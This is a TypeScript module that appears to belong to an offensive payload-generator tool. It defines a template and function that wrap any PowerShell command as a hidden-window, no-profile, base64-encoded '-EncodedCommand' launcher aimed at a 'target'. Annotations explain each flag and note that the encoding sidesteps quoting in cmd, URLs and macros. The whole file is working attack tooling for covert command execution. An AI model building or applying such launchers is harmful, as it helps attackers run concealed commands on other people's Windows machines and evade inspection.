import { utf16leBase64 } from "./encode";
import type { BuiltPayload, PayloadDef, PayloadPart } from "./types";

export const ENCODE_PS_DEF: PayloadDef = {
  id: "encode-ps", generator: "encode", title: "PowerShell -EncodedCommand", os: "windows",
  contexts: ["cmd", "powershell"], requires: ["powershell"],
  template: "powershell -nop -w hidden -e {B64}",
  parts: [],
  listener: "none",
};

const PARTS: PayloadPart[] = [
  { token: "powershell", explain: "Starts Windows PowerShell from cmd.exe or a PowerShell prompt." },
  { token: "-nop", explain: "-NoProfile: skips the user's profile script, so it starts faster and behaves the same everywhere." },
  { token: "-w hidden", explain: "-WindowStyle Hidden: no console window pops up on the target." },
  { token: "-e", explain: "-EncodedCommand: runs a base64 string. Trap: it must be base64 of UTF-16LE text (two bytes per character), not of UTF-8; plain base64 decodes to garbage and fails silently." },
  { token: "<base64>", explain: "The command, converted to UTF-16LE and then base64. Sidesteps quoting problems in cmd, URLs and macros." },
];

/** Wraps any PowerShell command as `powershell -nop -w hidden -e <UTF-16LE base64>`. */
export function encodePs(command: string): BuiltPayload {
  return {
    def: ENCODE_PS_DEF,
    text: `powershell -nop -w hidden -e ${utf16leBase64(command)}`,
    listener: null,
    parts: PARTS,
    notes: [`Decodes to: ${command}`],
    unresolved: [],
    prepare: null,
  };
}
